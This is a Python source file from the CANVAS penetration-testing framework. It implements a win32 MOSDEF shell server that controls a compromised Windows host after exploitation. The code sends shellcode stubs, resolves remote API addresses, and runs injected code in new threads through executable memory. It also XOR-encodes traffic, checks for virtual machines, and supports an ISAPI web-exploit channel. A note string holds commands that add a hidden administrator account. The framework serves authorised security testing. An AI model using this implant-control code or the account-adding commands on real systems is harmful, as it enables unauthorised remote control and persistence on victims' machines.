#! /usr/bin/env python

"""
CANVAS win32 shell server
Uses MOSDEF for dynamic assembly component linking
"""

#Proprietary CANVAS source code - use only under the license agreement
#specified in LICENSE.txt in your CANVAS distribution
#Copyright Immunity, Inc, 2002-2006
#http://www.immunityinc.com/CANVAS/ for more information

from shellserver import shellserver
from MOSDEFShellServer import MosdefShellServer, MSSgeneric
from WindowsMosdefShellServer import WindowsMosdefShellServer
from exploitutils import *
import time
import os
import re
import socket
from shellcode import shellcodeGenerator
import math
import struct
from canvaserror import *
from MOSDEF.mosdefutils import sint32

import StringIO
import uuid
import logging

#or whatever you've used as your trojan filename locally
#This file needs to exist in CWD locally
trojanfile="hs.exe"

#globals for win32
O_RDONLY = 0x0
O_RDWR= 0x2
O_CREAT=0x40
O_TRUNC=0x200
AF_INET=2
SOCK_STREAM=1
SOCK_DGRAM=2

MODE_ALL=0x1ff #777 (read,write,execute all,all,all)
#end globals

DUPLICATE_SAME_ACCESS=0x00000002
OF_READ=0
OF_READWRITE=2
OF_WRITE=1
#CreateFile flags
FILE_SHARE_DELETE=4
FILE_SHARE_READ=1
FILE_SHARE_WRITE=2
CREATE_NEW=1
CREATE_ALWAYS=2
OPEN_EXISTING=3
OPEN_ALWAYS=4
TRUNCATE_EXISTING=8
GENERIC_READ=long(0x80000000L)
GENERIC_WRITE=0x40000000
FILE_FLAG_BACKUP_SEMANTICS=0x2000000
FILE_NOTIFY_CHANGE_FILE_NAME=0x1
FILE_NOTIFY_CHANGE_DIR_NAME=0x2
FILE_NOTIFY_CHANGE_LAST_WRITE=0x10
FILE_LIST_DIRECTORY=0x1

FILE_ATTRIBUTE_READONLY             =0x00000001
FILE_ATTRIBUTE_HIDDEN               =0x00000002
FILE_ATTRIBUTE_SYSTEM               =0x00000004
FILE_ATTRIBUTE_DIRECTORY            =0x00000010
FILE_ATTRIBUTE_ARCHIVE              =0x00000020
FILE_ATTRIBUTE_ENCRYPTED            =0x00000040
FILE_ATTRIBUTE_NORMAL               =0x00000080
FILE_ATTRIBUTE_TEMPORARY            =0x00000100
FILE_ATTRIBUTE_SPARSE_FILE          =0x00000200
FILE_ATTRIBUTE_REPARSE_POINT        =0x00000400
FILE_ATTRIBUTE_COMPRESSED           =0x00000800
FILE_ATTRIBUTE_OFFLINE              =0x00001000
FILE_ATTRIBUTE_NOT_CONTENT_INDEXED  =0x00002000

IOCTL_BIOCGSTATS=9031
FILE_ANY_ACCESS=0

MAX_COMPUTERNAME_LENGTH = 15
HORZRES=8 #8
VERTRES=0x0a #0xa
SRCCOPY=0xcc0020
CF_BITMAP=2
DIB_RGB_COLORS=0
BI_RGB=0
GENERIC_ALL=0x10000000

#more fun access rights
KEY_READ=0x020019
KEY_WRITE=0x2001a
KEY_QUERY_VALUE=0x0001
KEY_SET_VALUE=0x0002
KEY_CREATE_SUB_KEY=0x0004
KEY_ENUMERATE_SUB_KEYS=0x0008
KEY_NOTIFY=0x0010
KEY_CREATE_LINK=0x0020
KEY_ALL_ACCESS=0xf003fL
HKEY_CLASSES_ROOT=0x80000000L
HKEY_CURRENT_USER=0x80000001L
HKEY_LOCAL_MACHINE=0x80000002L
HKEY_USERS=0x80000003L
HKEY_PERFORMANCE_DATA=0x80000004L
HKEY_CURRENT_CONFIG=0x80000005L
HKEY_DYN_DATA=0x80000006L
SYNCHRONIZE=0x00100000L

SC_MANAGER_ALL_ACCESS=0xF003F
SC_MANAGER_CONNECT=0x01
SC_MANAGER_CREATE_SERVICE=0x02
SC_MANAGER_ENUMERATE_SERVICE=0x04
SC_MANAGER_LOCK=0x08
SC_MANAGER_QUERY_LOCK_STATUS=0x10
SC_MANAGER_MODIFY_BOOT_CONFIG=0x20
SERVICE_QUERY_CONFIG=0x01
SERVICE_CHANGE_CONFIG=0x02
SERVICE_QUERY_STATUS=0x04
SERVICE_ENUMERATE_DEPENDANTS=0x08
SERVICE_CONTROL_STOP=0x01
SERVICE_START=0x10
SERVICE_STOP=0x20
SERVICE_PAUSE_CONTINUE=0x40
SERVICE_INTERROGATE=0x80
SERVICE_USER_DEFINED_CONTROL=0x100
SERVICE_STOPPED=0x01
SERVICE_START_PENDING=0x02
SERVICE_STOP_PENDING=0x03
SERVICE_USER_DEFINED_CONTROL=0x100
SERVICE_RUNNING=0x04
SERVICE_CONTINUE_PENDING=0x05
SERVICE_PAUSE_PENDING=0x06
SERVICE_PAUSED=0x07
SERVICE_ALL_ACCESS=0xF01FF


SERVICE_STATE_ALL=3
SERVICE_ACTIVE=1
SERVICE_INACTIVE=2
SERVICE_WIN32_OWN_PROCESS = 0x10
SERVICE_WIN32_SHARE_PROCESS  = 0x20
SERVICE_WIN32 = SERVICE_WIN32_OWN_PROCESS + SERVICE_WIN32_SHARE_PROCESS

SERVICE_FILE_SYSTEM_DRIVER=2
SERVICE_KERNEL_DRIVER=1
SERVICE_WIN32_OWN_PROCESS=0x10
SERVICE_WIN32_SHARE_PROCESS=0x20
SERVICE_INTERACTIVE_PROCESS=0x100

SERVICE_AUTO_START=0x2 #started by SCM
SERVICE_BOOT_START=0x0 #started by device manager at boot
SERVICE_DEMAND_START=0x3 #started using StartService
SERVICE_DISABLED=0x4 #disabled
SERVICE_SYSTEM_START=0x1 #ioinitsystem started

#error control codes
SERVICE_ERROR_IGNORE=0
SERVICE_ERROR_NORMAL=1
SERVICE_ERROR_SEVERE=2
SERVICE_ERROR_CRITICAL=3

PIPE_READMODE_MESSAGE=0x00000002
PIPE_READMODE_BYTE=0
PIPE_WAIT=0
PIPE_NOWAIT=1

SECPKG_CRED_OUTBOUND=2
SECPKG_CRED_INBOUND=1
SECPKG_CRED_BOTH=3
SC_MANAGER_CREATE_SERVICE=0x0002


MEM_COMMIT=0x1000
MEM_RESERVE=0x2000
PAGE_EXECUTE_READWRITE=0x40

FILE_MAP_ALL_ACCESS=0xf001f

SecurityAnonymous=0
SecurityIdentification=1
SecurityImpersonation=2
SecurityDelegation=3


POLICY_VIEW_LOCAL_INFORMATION=0x00000001L
POLICY_VIEW_AUDIT_INFORMATION=0x00000002L
POLICY_GET_PRIVATE_INFORMATION=0x00000004L
POLICY_TRUST_ADMIN=0x00000008L
POLICY_CREATE_ACCOUNT=0x00000010L
POLICY_CREATE_SECRET=0x00000020L
POLICY_CREATE_PRIVILEGE=0x00000040L
POLICY_SET_DEFAULT_QUOTA_LIMITS=0x00000080L
POLICY_SET_AUDIT_REQUIREMENTS=0x00000100L
POLICY_AUDIT_LOG_ADMIN=0x00000200L
POLICY_SERVER_ADMIN=0x00000400L
POLICY_LOOKUP_NAMES=0x00000800L
POLICY_NOTIFICATION=0x00001000L
#everyone says these three are the same for some reason.
STANDARD_RIGHTS_READ=0x00020000L
STANDARD_RIGHTS_WRITE=0x00020000L
STANDARD_RIGHTS_EXECUTE=0x00020000L
SPECIFIC_RIGHTS_ALL=0x0000FFFFL
STANDARD_RIGHTS_ALL=0x001F0000L
STANDARD_RIGHTS_REQUIRED=0x000f0000L
POLICY_ALL_ACCESS=STANDARD_RIGHTS_REQUIRED | 4095

STATUS_ACCESS_DENIED=0xc0000022L


MAXIMUM_ALLOWED=0x02000000L

TOKEN_DUPLICATE=0x02
TOKEN_QUERY=0x08

LOGON32_PROVIDER_DEFAULT=0
LOGON32_PROVIDER_WINNT35=1
LOGON32_PROVIDER_WINNT40=2
LOGON32_PROVIDER_WINNT50=3
LOGON32_LOGON_INTERACTIVE=2
LOGON32_LOGON_UNLOCK = 7

# EXTENDED_NAME_FORMAT enum
# https://msdn.microsoft.com/en-us/library/windows/desktop/ms724268%28v=vs.85%29.aspx
NameUnknown           = 0
NameFullyQualifiedDN  = 1
NameSamCompatible     = 2
NameDisplay           = 3
NameUniqueId          = 6
NameCanonical         = 7
NameUserPrincipal     = 8
NameCanonicalEx       = 9
NameServicePrincipal  = 10
NameDnsDomain         = 12

MOVEFILE_DELAY_UNTIL_REBOOT = 0x4

DRIVE_TYPES={"DRIVE_UNKNOWN":0, "DRIVE_NO_ROOT_DIR":1,
             "DRIVE_REMOVABLE":2, "DRIVE_FIXED":3,
             "DRIVE_REMOTE":4, "DRIVE_CDROM":5,
             "DRIVE_RAMDISK":6}

accessDict={}
accessDict["KEY_ALL_ACCESS"]         = KEY_ALL_ACCESS
accessDict["KEY_QUERY_VALUE"]        = KEY_QUERY_VALUE
accessDict["KEY_SET_VALUE"]          = KEY_SET_VALUE
accessDict["KEY_READ"]               = KEY_READ
accessDict["KEY_WRITE"]              = KEY_WRITE
accessDict["KEY_ENUMERATE_SUB_KEYS"] = KEY_ENUMERATE_SUB_KEYS

keyDict={}
keyDict["HKEY_LOCAL_MACHINE"]=HKEY_LOCAL_MACHINE
keyDict["HKEY_CURRENT_USER"]=HKEY_CURRENT_USER

TokenPrimary=1
TokenImpersonation=2

quicknote="""
To add a new user in Windows:
net user bob bob /add
net localgroup administrators bob /add
"""

from MOSDEF.win32remoteresolver import win32remoteresolver


win32errs={}
win32errs[3]="ERROR_PATH_NOT_FOUND"
win32errs[6]="Invalid Handle"
win32errs[0x7e]="ERROR_MOD_NOT_FOUND"
win32errs[1349]="Bad Token Type"

class old_win32shellserver(WindowsMosdefShellServer, MSSgeneric, shellserver, win32remoteresolver):
    """
    this is the win32 MOSDEF Shell Server class
    """

    def __init__(self, connection, node, logfunction=None):

        win32remoteresolver.__init__(self)
        shellserver.__init__(self,connection,type="Active",logfunction=logfunction)
        WindowsMosdefShellServer.__init__(self, "win32")
        MSSgeneric.__init__(self, 'x86')

        self.order=intel_order
        self.unorder=istr2int
        self.remotefunctioncache={}
        self.cached_comspec=""
        self.currentprocess=None
        self.node=node
        self.node.shell=self
        self.SO_REUSEADDR = 4
        self.fromcreatethread=0
        self.doxor=0 #not initialized yet
        self.myexploit=None
        self.locale="" #none by default

        self.log("[+] XOR Key set to 0x%2.2x"%self.xorkey)

        self.has_wow_64 = None # Set in startup()
        self.is_wow_64  = None # Set in startup()


    def xorblock(self,block):
        #xorblock with key a5
        data2=[]
        for a in block:
            data2+=[chr(ord(a)^self.xorkey)]
        data="".join(data2)
        #end xorblock
        return data

    def decode(self,data):
        " handles incoming encrypted/encoded data "
        devlog("decode", "datalen=%d doxor=%s" % (len(data), self.doxor))
        # find out where those xorred ints are sent !!!
        if self.doxor:
            devlog("decode", "Doing unxor")
            #print "before doxor: %s"%hexprint(data[:10])
            data = self.xorblock(data)
            #print "after doxor: %s"%hexprint(data[:10])
        return data

    def reliableread(self,length):
        """
        reliably read off our stream without being O(N). If you just
        do a data+=tmp, then you will run into serious problems with large
        datasets
        """
        #if we're an ISAPI GO Code we need to obey ISAPI rules...SSL, etc.
        if self.usingISAPI():
            data=self.myexploit.webrecv(self.connection,size=length)
            data=self.decode(data)
            return data

        data=""
        datalist=[]
        readlength=0

        while readlength<length:
            tmp=self.node.parentnode.recv(self.connection,length-readlength)
            if tmp=="":
                self.log("Connection broken?!?")
                break
            readlength+=len(tmp)
            datalist.append(tmp)
        data="".join(datalist)
        data = self.decode(data)
        return data

    def readword(self):
        """ read one word off our stream (XXX: dword!) """
        data = self.reliableread(4)
        return self.unorder(data)

    def short_from_buf(self,buf):
        return istr2halfword(buf)

    def readshort(self):
        data=self.reliableread(2)
        return self.short_from_buf(data)

    def readbuf(self,size):
        return self.reliableread(size)

    def readbufintofile(self,size,outfile):
        """
        Reads data from a buffer remotely into our outfile
        """
        neededsize=size
        while neededsize>0:
            #print neededsize
            if neededsize>9000:
                getsize=9000
            else:
                getsize=neededsize

            data=self.reliableread(getsize)
            outfile.write(data)
            neededsize=neededsize-getsize
        return 1


    def readblock(self, fileobj=None):
        """
        Reads one block at a time...<int><buf>

        We read as much as we can off the socket, and if fileobj is
        an actual file, we write it directly into the file (after decoding it)
        otherwise, we return the data

        Having a file as an option allows us to grab huge chunks of data from
        the socket without storing them all in our memory. Storing everything
        in ram is a bad idea for SILICA or other memory-restricted environments.
        """
        data=[]
        tmp=""
        wanted=self.readint() #the size we are recieving
        #print "win32 readblock() wanted=%d"%wanted
        while wanted>0:
            #print "before recv %d"%wanted
            #cap the amount we recv in one go at 1024, in case we
            #have a particularally large number.
            #we don't want to use up all of our ram in this reliable recv
            recvsize=1024
            if wanted < recvsize:
                recvsize=wanted
            if self.usingISAPI():
                tmp=self.myexploit.webrecv(self.connection,size=recvsize)
            else:
                tmp=self.node.parentnode.recv(self.connection,recvsize)
            #print "after recv %d"%len(tmp)
            if tmp=="":
                logging.error("Connection broken?")
                break
            #print "data+=%s"%prettyprint(tmp)
            #print "Data in readblock += len=%d"%len(tmp)
            if fileobj==None:
                data.append(tmp)
            else:
                fileobj.write(self.decode(tmp))
                fileobj.flush()
            wanted=wanted-len(tmp)
        data="".join(data)
        data=self.decode(data)
        #print "Done with readblock"
        #print data
        return data

    def readblocks(self):
        """
        readint(X)
        read(X) bytes
        until X is 0
        """
        ret=[]
        block="A"
        while block!="":
            block=self.readblock()
            ret+=[block]
        ret="".join(ret)
        return ret

    def readblocksintofile(self,outfile):
        """
        readint(X)
        read(X) bytes
        until X is 0
        output into file using write()
        """

        block="A"
        while block!="":
            block=self.readblock()
            outfile.write(block)
        return

    def writeint(self,word):
        data=intel_order(word)
        #need to make reliable
        self.node.parentnode.send(self.connection,data)
        return

    def writebuf(self,request):
        "sends the data to our client. This does NOT add a integer to the front for size"
        #need to make reliable and need to make
        if self.usingISAPI():
            self.myexploit.websend(self.connection,request)
        else:
            self.node.parentnode.send(self.connection,request)
        return

    def writebuffromfile(self,infile):
        """
        Writes data from a file down the wire...
        """
        data=infile.read(1000)
        while data!="":
            self.writebuf(data)
            data=infile.read(1000)
        return

    def read_uni_string(self):
        """
	Read a UTF-16-le string from the remote host
	"""
        devlog("win32","Reading unicode string from remote host")
        ret=self.readblock()
        #check to see if we have a double null at the end (we don't want null terminators internally)
        if ret[-2:]=="\x00\x00":
            ret=ret[:-2]
        ret=ret.decode("utf_16_le")
        return ret

    def readstruct(self,args):
        "a quicky function to read entire structures from a client"
        ret={}
        for typestr,member in args:
            if typestr=="l":
                ret[member]=self.readint()
            elif typestr=="s":
                ret[member]=self.readshort()
        return ret

    def readint(self, signed=False):
        "read an integer from the remote side"

        return self.readword() if not signed else sint32(self.readword())

    def sendblock(self,outstr):
        """
        <int><data> to remote end
        """
        ret=self.writebuf(self.order(len(outstr))+outstr)
        return ret

    def sendstring(self,outstr):
        "send string to remote host"
        outstr+="\x00" #add terminating null
        ret=self.sendblock(outstr)
        return ret

    def sendint(self,outint):
        "send an integer to the remote side"
        ret=self.writebuf(self.order(outint))
        return ret

    def readstring(self):
        """strings are just blocks
        Null terminator is not sent by remote side
        """
        return self.readblock()

    def readunistring(self):
        ret=self.readblock()
        ret=ret.replace("\x00","") #no more unicode :>
        return ret

    def setListenPort(self,port):
        self.listenport=port
        return

    def getASMDefines(self):
        return ""

    def assemble(self,code):
        return ""

    def printvalidthreadtokens(self):
        """Prints all valid thread tokens(win32)"""
        return self.not_implemented()

    def havemalloc(self):
        "returns true if we have the malloc libraries imported into our cache"

        #return False #turn me off
        if "kernel32.dll|GlobalAlloc" in self.remotefunctioncache \
           and "kernel32.dll|GlobalFree" in self.remotefunctioncache \
           and "ws2_32.dll|recv" in self.remotefunctioncache:
            return True
        return False #not all the things are imported

    def sendrequest_newthread(self,message):
        """
        message is shellcode that we want to execute in a new thread.
        IT MUST NOT USE SENDINT() (or other send*() functions) if
        MOSDEF is not fully threaded (which it's not)
        """
        self.log("Starting a new thread with shellcode length: %d"%len(message))
        vars = {}
        vars["message"]=message
        vars["messagesize"]=len(message)
        code = """
        //we just leak some memory here for the new thread.
        //don't use this in a loop without using clearthread()
        #import "remote","kernel32.dll|CreateThread" as "CreateThread"
        #import "remote","kernel32.dll|VirtualAlloc" as "VirtualAlloc"
        #import "local","sendint" as "sendint"
        #import "local","memcpy" as "memcpy"
        #import "local","malloc" as "malloc"
        #import "string","message" as "message"
        #import "int","messagesize" as "messagesize"
        #import "local","debug" as "debug"
        void main() {
           int i;
           char *p;
           char *startaddress;
           //some buffer space
           p=VirtualAlloc(0,messagesize+0x1100,0x1000,0x40);
           sendint(p);
           startaddress=p+0x1000;
           memcpy(startaddress,message,messagesize);
           //debug();
           i=CreateThread(0,0,startaddress,0,0,0);
           sendint(i);
        }
        """
        self.clearfunctioncache()
        message=self.compile(code,vars)
        self.sendrequest(message)
        mallocspace=self.readint()
        threadid=self.readint()
        self.log('Started new thread: %x'%(threadid))
        self.leave()
        return mallocspace,threadid

    def clearthread(self,threadid,mallocspace):
        """
        After you create a thread with sendrequest_newthread()
        you will sometimes be able to clean up after it by
        killing the thread and freeing the area you malloced.
        """
        vars = {}
        vars["threadid"]=threadid
        vars["mallocspace"]=mallocspace
        code = """
        #import "remote", "kernel32.dll|TerminateThread" as "TerminateThread"
        #import "local","sendint" as "sendint"
        #import "local","free" as "free"
        #import "int","threadid" as "threadid"
        #import "int","mallocspace" as "mallocspace"
        void main() {
           int i;
           if (threadid!=0) {
               i=TerminateThread(threadid,0);
            }
           free(mallocspace);
        }
        """

        self.clearfunctioncache()
        message=self.compile(code,vars)
        self.sendrequest(message)
        self.leave()
        return

    def checkvm(self):
        "checks if we're inside a VM by checking for a relocated idt"
        self.log("[!] Checking if we're inside a VirtualMachine")
        vars = {}
        code = """
        #import "local", "sendint" as "sendint"
        #import "local", "checkvm" as "checkvm"

        void
        main()
        {
            int i;
            i = checkvm();
            sendint(i);
        }
        """

        self.clearfunctioncache()
        #print "Cleared function cache for checkvm"
        request=self.compile(code,vars)

        self.sendrequest(request)
        ret = self.readint()
        self.leave()
        devlog("checkvm", "checkvm sent back a %d"%ret)

        # Decide what to do based on the value returned
        # various known VMWare/etc values
        vm_values = [0xd0, 0xff, 0xe8, 128]

        if ret in vm_values:
            self.log("[!] Looks like we're on virtual hardware :)")
        else:
            ret = 0
            self.log("[!] Looks like we're on real hardware :)")


        return ret



    def loadlibrarya_withmalloc(self,library):
        "uses GlobalAlloc/Free, if we have it. Faster and cooler"
        devlog("win32", "Using loadlibrary_withmalloc! (%s)"%library)
        vars={}
        #kernel32.dll|loadlibrarya always exists in functioncache
        code="""
        #import "remote", "kernel32.dll|loadlibrarya" as "loadlibrarya"
        #import "local", "readstringfromself" as "readstringfromself"
        #import "local", "malloc" as "malloc"
        #import "local", "free" as "free"
        #import "local", "sendint" as "sendint"
        #import "local", "debug" as "debug"
        void main()
        {
        unsigned int i;
        char * library;

        //debug();
        library=readstringfromself();
        i=loadlibrarya(library);
        sendint(i);
        free(library);
        }
        """

        # XXX: proper ordering ??? .. clear before compile
        #self.savefunctioncache()
        self.clearfunctioncache()
        #self.restorefunctioncache()

        #devlog("win32", "Compiling loadlibrary_with_malloc")
        request=self.compile(code,vars)

        #devlog("win32", "Done compiling loadlibrary_with_malloc")
        self.sendrequest(request)
        self.sendstring(library)
        ret=uint32(self.readint())
        self.leave()
        # self.log("Loadlibrary %s = %8.8x"%(library,ret))
        libraryp=library+"|"
        self.remotefunctioncache[libraryp]=ret
        return ret

    def loadlibrarya(self,library):

        if not self.started:
            self.startup()

        devlog('win32shellserver::loadlibrarya', "loadlibrarya %s" % library)

        libraryp=library+"|" #pipe separator with nothing after it is the library
        if libraryp in self.remotefunctioncache:
            return self.remotefunctioncache[libraryp]

        if self.havemalloc():
            #we can use the malloc version
            return self.loadlibrarya_withmalloc(library)

        #this code works without needing malloc and free, but is slower.

        vars={}
        #kernel32.dll|loadlibrarya always exists in functioncache
        vars["library"]=library
        code="""
        #import "remote", "kernel32.dll|loadlibrarya" as "loadlibrarya"
        #import "string", "library" as "library"
        #import "local", "sendint" as "sendint"
        #import "local", "debug" as "debug"
        void main()
        {
        unsigned int i;
        //debug();
        i=loadlibrarya(library);
        sendint(i);
        }
        """

        # XXX: proper ordering ??? .. clear before compile ..
        self.savefunctioncache()
        self.clearfunctioncache()
        request=self.compile(code,vars)
        self.restorefunctioncache()

        self.sendrequest(request)
        ret=uint32(self.readint())
        self.leave()
        devlog("win32", "Loadlibrary %s = %8.8x"%(library,ret))
        self.remotefunctioncache[libraryp]=ret
        return ret


    def LoadLibraryExW(self,library):
        vars={}
        vars['library']=library
        code="""
        #import "remote","kernel32.dll|LoadLibraryExW" as "LoadLibraryExW"
        #import "string","library" as "library"
        #import "local","sendint" as "sendint"
        void main()
        {
        unsigned int i;
        i=LoadLibraryExW(library,0,1); //DONT_RESOLVE_DLL_REFERENCES
        sendint(i);
        }
        """
        self.clearfunctioncache()
        request=self.compile(code,vars)
        self.sendrequest(request)
        ret=uint32(self.readint())
        self.leave()
        return ret

    def GetProcAddress(self,handle,function):
        """a 'real' GetProcAddress"""
        devlog("win32", "GetProcAddress(%x, %s)"%(handle, function))
        vars={}
        vars['handle']=handle
        vars['function']=function
        code="""
        #import "remote","kernel32.dll|GetProcAddress" as "GetProcAddress"
        #import "int","handle" as "handle"
        #import "string","function" as "function"
        #import "local","sendint" as "sendint"
        void main()
        {
        unsigned int i;
        i=GetProcAddress(handle,function);
        sendint(i);
        }
        """
        self.clearfunctioncache()
        request=self.compile(code,vars)
        self.sendrequest(request)
        ret=uint32(self.readint())
        self.leave()
        devlog("win32", "GetProcAddress returned: %x"%ret)
        return ret

    def getprocaddress_withmalloc(self,procedure):
        """
        uses malloc/free for speed
        """
        #devlog("win32","Using getprocaddress_withmalloc for speed! %s"%procedure)
        vars={}
        #always exists
        library,procname=procedure.split("|")
        libaddr=self.loadlibrarya(library)
        #vars["libaddr"]=libaddr
        #vars["procedure"]=procname

        code="""
        #import "remote", "kernel32.dll|getprocaddress" as "getprocaddress"
        // #import "int", "libaddr" as "libaddr"
        // #import "string", "procedure" as "procedure"
        #import "local", "sendint" as "sendint"
        #import "local", "debug" as "debug"
        #import "local", "readstringfromself" as "readstringfromself"
        #import "local", "readintfromself" as "readintfromself"
        #import "local", "free" as "free"
        void main()
        {
        unsigned int i;
        int libaddr;
        char * procedure;
        //debug();
        procedure=readstringfromself();
        libaddr=readintfromself();
        i=getprocaddress(libaddr, procedure);
        sendint(i);
        free(procedure);
        }
        """
        #self.savefunctioncache()
        self.clearfunctioncache()
        #devlog("win32","Compiling getprocaddress_with_malloc")
        request=self.compile(code,vars)
        #devlog("win32","Done compiling getprocaddress_with_malloc")
        #self.restorefunctioncache()
        self.sendrequest(request)
        self.sendstring(procname)
        self.sendint(libaddr)

        ret=uint32(self.readint())
        if ret!=0:
            self.remotefunctioncache[procedure]=ret
        # self.log("Getprocaddr_withmalloc: Found %s at %8.8x"%(procedure,ret))
        #really should be "popfunctioncache"

        #self.clearfunctioncache()
        self.leave()
        if ret==0:
            raise Exception,"GetProcAddress for %s not found!"%procedure

        return ret

    def getprocaddress(self, procedure):
        """call getprocaddress - we only get here if we don't have it in the cache
        input "procedure" example: "msvcrt.dll|_getcwd"
        """

        #devlog("win32", "Self=%x functioncache(%x)=%s"%(id(self),id(self.remotefunctioncache),self.remotefunctioncache))
        if procedure in self.remotefunctioncache:
            devlog("win32", "Returning Cached value for %s->%x"%(procedure, self.remotefunctioncache[procedure]))
            return self.remotefunctioncache[procedure]
        # self.log("%s not in cache - retrieving remotely."%procedure)

        if self.havemalloc():
            #we can use the malloc version
            return self.getprocaddress_withmalloc(procedure)

        vars={}
        #always exists
        library,procname=procedure.split("|")
        libaddr=self.loadlibrarya(library)
        vars["libaddr"]=libaddr
        vars["procedure"]=procname

        code="""
        #import "remote", "kernel32.dll|getprocaddress" as "getprocaddress"
        #import "int", "libaddr" as "libaddr"
        #import "string", "procedure" as "procedure"
        #import "local", "sendint" as "sendint"
        #import "local", "debug" as "debug"
        void main()
        {
        unsigned int i;
        //debug();
        i=getprocaddress(libaddr, procedure);
        sendint(i);
        }
        """
        self.savefunctioncache()
        self.clearfunctioncache()
        request=self.compile(code,vars)
        self.restorefunctioncache()
        self.sendrequest(request)

        ret=uint32(self.readint())
        if ret!=0:
            self.remotefunctioncache[procedure]=ret
        # self.log("Found %s at %8.8x"%(procedure,ret))
        #really should be "popfunctioncache"

        #self.clearfunctioncache()
        self.leave()
        if ret==0:
            raise Exception,"GetProcAddress for %s not found!"%procedure

        return ret

    def getremote(self,functionname):
        """
        gets the remote function
        """
        devlog("win32", "getremote: %s"%functionname)
        self.savefunctioncache()
        procedure=self.getprocaddress(functionname)
        self.restorefunctioncache()

        return procedure #0 if fail

    def startup(self):
        """ Send over our FD and proc address stubs, followed by a DEP safe MOSDEF loop """

        if self.started:
            while not self.donestarting:
                self.log("Waiting for Node startup ...")
                time.sleep(1)
            return 0

        self.log("Starting up Win32 MOSDEF Node !")

        try:
            self.connection.set_timeout(160)
        except:
            logging.error("Likely an ipv6 socket, set_timeout not supported!")

        self.log("Argsdict = %s"%self.argsDict)

        # load variables
        self.fromcreatethread = self.argsDict.get("fromcreatethread", self.fromcreatethread)
        self.isapidict = self.argsDict.get("isapidict", {}) # null dict if no isapi
        self.started = 1

        standardMode = (self.isapidict == {})

        if standardMode == True:

            # split this into seperate startup functions ?
            try:
                self.connection.set_timeout(160)
            except:
                logging.info("[!] Likely an ipv6 socket, set_timeout not supported !")

            sc = shellcodeGenerator.win32()

            if self.fromcreatethread:
                devlog("win32mosdef", "Using createthread findeipnoesp code")
                sc.addAttr("findeipnoesp", {"savereg" : "createthread"})
            else:
                #assume socket is already in esi
                devlog("win32mosdef", "Assuming socket fd is in esi")
                sc.addAttr("findeipnoesp", {"savereg" : "esi"})

            # initial mosdef stub
            self.log("Getting fd, main functions, and initing main MOSDEF LOOP")

            sc.addAttr("LoadSavedRegAsFD", None)
            sc.addAttr("sendFD",None)
            sc.addAttr("sendGetProcandLoadLib",None)
            sc.addAttr("loadFDasreg", {"reg" : "esi"})
            sc.addAttr("RecvExecAllocLoop", None) # XXX: DEP compatible, can work from esi assumption
            sc.addAttr("ExitThread", {"closesocket": 1})

            getfd = sc.get()

            self.sendrequest(getfd) # this now also contains our main loop

            # now read in our little endian word that is our fd (originally in ebx)
            self.log("Reading remote fd")
            self.log("NOTE: If the process stalls here, it is possible you did not set -i fromcreatethread ! It is also possible DEP on XP SP2 or Windows 2003 or Windows Vista has killed the process")

            self.fd = self.readword()

            self.log("Self.fd = %8.8x" % uint32(self.fd))
            if self.fd < 0 or self.fd > 0x7fffffff:
                logging.warning("\n"*4 + "********Warning: FD<0! Serious problem here..." + "\n"*4)

            self.remotefunctioncache["kernel32.dll|getprocaddress"]=self.readint()
            self.remotefunctioncache["kernel32.dll|loadlibrarya"]=self.readint()
            self.remotefunctioncache["ws2_32.dll|send"]=self.readint()

            self.log("GetProcAddress=%8.8x"%uint32(self.remotefunctioncache["kernel32.dll|getprocaddress"]))
            self.log("LoadLibraryA=%8.8x"%uint32(self.remotefunctioncache["kernel32.dll|loadlibrarya"]))
            self.log("Send=%8.8x"%uint32(self.remotefunctioncache["ws2_32.dll|send"]))

            self.leave()
        else:

            # isapicode
            # first we need to recv our variables...
            # the next bytes are READCLIENT,WRITECLIENT, and CONTEXTPOINTER (4 bytes each, of course)
            self.myexploit = self.isapidict["exploit"]
            self.readclient = self.readword()
            self.writeclient = self.readword()
            self.context = self.readword()
            self.log("ReadClient() = %8.8x WriteClient() = %8.8x Context = %8.8x"%(self.readclient,self.writeclient,self.context))
            self.remotefunctioncache["ecb|"] = self.context
            self.remotefunctioncache["ecb|readclient"] = self.readclient
            self.remotefunctioncache["ecb|writeclient"] = self.writeclient

            # now we need to get ProcAddrA and LoadLibrary
            sc = shellcodeGenerator.win32()
            sc.addAttr("findeipnoesp",None)
            isapidict = {"readclient": self.readclient, "writeclient": self.writeclient, "context": self.context}

            sc.addAttr("IsapiSendInfo", isapidict)
            #sc.addAttr("IsapiRecvExec", None) #included in sendinfo .. XXX: this should valloc for DEP safety !!
            sc.addAttr("ExitThread", None)

            try:
                self.connection.set_timeout(None)
            except:
                logging.warning("Likely an ipv6 socket, set_timeout not supported")

            getfd = sc.get()
            self.log("Sending 0x%x bytes to get information..."%len(getfd))
            #if debugging..
            #getfd="\xcc"+getfd
            self.sendrequest(getfd)
            #now read in our little endian word that is our fd (originally in ebx)
            self.remotefunctioncache["kernel32.dll|getprocaddress"] = self.readint()
            self.remotefunctioncache["kernel32.dll|loadlibrarya"] = self.readint()

            self.leave()

            self.log("Getprocesss=%8.8x loadlibrarya=%8.8x"%(self.remotefunctioncache["kernel32.dll|getprocaddress"],
                                                             self.remotefunctioncache["kernel32.dll|loadlibrarya"]))

            #now generate the ISAPI mainloop...
            sc = shellcodeGenerator.win32()
            sc.addAttr("findeipnoesp", None)
            sc.addAttr("IsapiRecvExecLoop", isapidict) # XXX: this should valloc for DEP compatibility
            sc.addAttr("ExitThread", None)

            mainloop = sc.get()
            self.log("Main MOSDEF loop is 0x%x bytes long."%len(mainloop))
            #self.log("Code = %s"%sc.getcode())
            self.sendrequest(mainloop)
            self.leave()

            # END OF ISAPI END OF ISAPI END OF ISAPI


        self.log("Setting up Win32 dynamic linking assembly component server")
        self.initLocalFunctions()
        self.doxor = 1
        self.log("Initialized Local Functions.")

        try:
            self.connection.set_timeout(None) #we know it works...
        except:
            logging.warning("[!] likely an ipv6 socket, set_timeout not supported !")


        self.getprocaddress("kernel32.dll|GlobalAlloc")
        self.getprocaddress("kernel32.dll|GlobalFree")
        self.getprocaddress("ws2_32.dll|recv")
        self.locale=self.getlocale() #returns a tuple

        #now let's check to see if we are a WoW64 process
        self.is_wow_64 = False

        try:
            self.has_wow_64 = self.getprocaddress("kernel32.dll|IsWow64Process")
        except:
            self.log("Checked for IsWoW64Process, failed")
            self.has_wow_64 = False
        if self.has_wow_64:
            #this platform supports wow64 (although it may still be a 32-bit platform)
            self.is_wow_64 = self.IsWow64Process()

        self.donestarting = 1
        return self.donestarting


    def run(self):
        """
        Placeholder
        """

        return

